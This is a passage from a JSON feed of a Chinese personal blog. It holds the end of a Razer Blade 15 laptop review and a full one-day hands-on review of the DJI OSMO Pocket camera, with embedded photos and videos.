对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]